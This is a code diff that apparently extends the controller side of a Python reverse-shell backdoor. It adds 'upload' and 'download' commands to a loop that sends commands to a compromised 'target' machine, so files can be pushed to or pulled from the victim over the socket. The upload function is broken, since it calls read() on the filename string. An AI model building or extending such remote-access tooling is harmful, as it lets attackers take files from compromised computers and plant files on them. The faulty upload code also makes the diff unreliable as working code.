@@ -14,6 +14,22 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+def upload_file(file):
+    f = open(file, 'rb')
+    target.send(file.read())
+
+def download_file(file):
+    f = open(file, "wb")
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
 
 def target_communication(ip):
     while True:
@@ -25,6 +41,10 @@ def target_communication(ip):
             os.system('clear')
         elif command[:3] == 'cd ':
             pass
+        elif command[:8] == "download":
+            download_file(command[9:])
+        elif command[:6] == "upload":
+            upload_file(command[7:])
         else:
             result = reliable_recv()
             print(result)
